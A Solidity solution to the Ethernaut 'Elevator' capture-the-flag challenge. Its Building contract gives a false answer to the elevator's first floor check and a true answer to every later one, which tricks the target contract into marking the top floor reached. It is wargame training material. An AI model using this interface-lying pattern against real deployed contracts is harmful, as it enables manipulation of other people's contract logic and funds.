// SPDX-License-Identifier: MIT
// Original challenge at: https://ethernaut.openzeppelin.com/level/0x4A151908Da311601D967a6fB9f8cFa5A3E88a251
pragma solidity ^0.8.0;

contract Building {

    bool isTopFloor;
    Elevator elevator;

    constructor() {
        isTopFloor = false;
        elevator = Elevator(0x72C1B5605988446D21c2F9072c3F62c7158700c8);
    }

    function isLastFloor(uint _floor) external returns (bool) {
        if(!isTopFloor) {
            isTopFloor = true;
            return false;
        } else {
            return true;
        }
    }

    function pushButton(uint floor) public {
        elevator.goTo(floor);
    }

}

abstract contract Elevator {
    function goTo(uint _floor) public virtual;
}